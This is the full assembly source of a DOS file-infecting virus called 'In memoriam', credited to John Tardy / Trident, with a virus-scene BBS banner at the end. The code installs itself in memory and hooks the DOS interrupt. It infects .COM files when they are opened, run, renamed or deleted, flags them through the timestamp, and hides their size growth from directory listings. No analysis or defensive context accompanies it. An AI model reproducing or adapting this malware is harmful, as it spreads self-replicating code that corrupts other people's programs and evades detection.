;
; In memoriam Virus by John Tardy / Trident
;

                Org 0h

Main:           Push Ax
                call Get_Ofs
Get_Ofs:        pop Bp
                sub Bp,Get_Ofs
                Mov Ax,0DEADh
                Int 21h
                Cmp Ax,0AAAAh
                Je  Installed

                mov ax,3521h
                int 21h
                mov word ptr cs:old21[bp],bx
                mov word ptr cs:old21[bp][2],es

                mov     ax,cs                   ;adjust memory-size
                dec     ax
                mov     ds,ax
                cmp     byte ptr ds:[0000],'Z'
                jne     installed
                mov     ax,word ptr ds:[0003]
                sub     ax,ParLen
                jb      installed
                mov     word ptr ds:[0003],ax
                sub     word ptr ds:[0012h],ParLen
                lea     si,main[bp]
                mov     di,0
                mov     es,ds:[12h]
                mov     ds,cs
                mov     cx,virlen
                cld
                rep     movsb
                mov     ax,2521h
                mov     ds,es
                mov     dx,offset new21
                int     21h
Installed:      Mov Di,100h
                Lea Si,Org_Prg[Bp]
                Push Cs
                Push Cs
                Pop Ds
                Pop Es
                Cld
                Movsw
                Movsb
                Mov Bx,100h
                Pop Ax
                Push Bx
                Ret

Old21           dd 0

New21:          cmp ax,0deadh
                jne chkfunc
                mov ax,0aaaah
                iret
chkfunc:
                cmp ah,11h
                je  findFCBst
                cmp ah,12h
                je findfcbst
                cmp ah,4eh
                je findst
                cmp ah,4fh
                je findst
                push ax
                push bx
                push cx
                push dx
                push si
                push di
                push bp
                push ds
                push es
                cmp ah,3dh
                je  infectHan
                cmp ax,4b00h
                je  infectHan
                cmp ah,41h
                je  infectHan
                cmp ah,43h
                je  infectHan
                cmp ah,56h
                je  infectHan
                cmp ah,0fh
                je  infectFCB
                cmp ah,23h
                je  infectFCB
                jmp endint

findfcbst:      jmp findfcb
findst:         jmp find

InfectFCB:      mov si,dx
                inc si
                push cs
                pop es
                lea di,fnam
                mov cx,8
                rep movsb
                mov cx,3
                inc di
                rep movsb
                lea dx,fnam
                push cs
                pop ds

InfectHan:      mov si,dx
                mov cx,100h
                cld
findpnt:        lodsb
                cmp al,'.'
                je  chkcom
                loop findpnt
                jmp  endi
chkcom:         lodsw
                or ax,2020h
                cmp ax,'oc'
                jne endi
                lodsb
                or al,20h
                cmp al,'m'
                jne endi
                jmp doit
endi:           jmp endint
doit:           push dx
                push ds
                mov ax,4300h
                pushf
                call dword ptr cs:[old21]
                mov cs:fatr,cx
                mov ax,4301h
                xor cx,cx
                pushf
                call dword ptr cs:[old21]
                mov ax,3d02h
                pushf
                call dword ptr cs:[old21]
                jnc getdate
                jmp error
getdate:        xchg ax,bx
                mov ax,5700h
                pushf
                call dword ptr cs:[old21]
                mov cs:fdat,cx
                mov cs:fdat[2],dx
                and cx,1fh
                cmp cx,1fh
                jne chkexe
                jmp done
chkexe:         mov ah,3fh
                push cs
                pop ds
                lea dx,Org_prg
                mov cx,3
                pushf
                call dword ptr cs:[old21]
                cmp word ptr cs:Org_prg[0],'ZM'
                je  close
                cmp word ptr cs:Org_prg[0],'MZ'
                je close

                Mov ax,4202h
                xor cx,cx
                xor dx,dx
                pushf
                call dword ptr cs:[old21]
                sub ax,3
                mov cs:jump[1],ax

                mov ah,40h
                push cs
                pop ds
                lea dx,main
                mov cx,virlen
                pushf
                call dword cs:[old21]
                mov ax,4200h
                xor cx,cx
                xor dx,dx
                mov ah,40h
                lea dx,jump
                mov cx,3
                pushf
                call dword cs:[old21]

                or  cs:fdat,01fh

close:          mov ax,5701h
                mov cx,cs:fdat
                mov dx,cs:fdat[2]
                pushf
                call dword ptr cs:[old21]
done:           mov ah,3eh
                pushf
                call dword ptr cs:[old21]
                pop ds
                pop dx
                push dx
                push ds
                mov ax,4301h
                mov cx,fatr
                pushf
                call dword ptr cs:[old21]

error:          pop ds
                pop dx

endint:         pop es
                pop ds
                pop bp
                pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
                jmp dword ptr cs:[old21]

getdta:
                pop si
                pushf
                push ax
                push bx
                push es
                mov  ah,2fh
                call dos
                jmp short si

FindFCB:        call    DOS                             ; call orginal interrupt
                cmp     al,0                            ; error ?
                jne     Ret1
                call    getdta
                cmp     byte ptr es:[bx],-1             ; extended fcb ?
                jne     FCBOk
                add     bx,8                            ; yes, skip 8 bytes
FCBOk:          mov     al,es:[bx+16h]                  ; get file-time (low byte)
                and     al,1fh                          ; seconds
                cmp     al,1fh                          ; 62 seconds ?
                jne     FileOk                          ; no, file not infected
                sub     word ptr es:[bx+1ch],Virlen     ; adjust file-size
                sbb     word ptr es:[bx+1eh],0
                jmp     short Time

Find:           call    DOS
                jc      Ret1
                call    getdta
                mov     al,es:[bx+16h]
                and     al,1fh
                cmp     al,1fh
                jne     FileOk
                sub     word ptr es:[bx+1ah],VirLen
                sbb     word ptr es:[bx+1ch],0
Time:           xor     byte ptr es:[bx+16h],10h
FileOk:         pop     es
                pop     bx
                pop     ax
                popf
Ret1:           retf    2

dos:            pushf
                call    dword ptr cs:[old21]
                ret

Org_prg         dw 0cd90h
                db 21h

fnam            db 8 dup (0)
                db '.'
                db 3 dup (0)
                db 0
fatr            dw 0
fdat            dw 0,0


jump            db 0e9h,0,0

                Db 'In memoriam 14-10-92'

VirLen          Equ $-Main
ParLen          Equ (VirLen/10h)+10h





;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
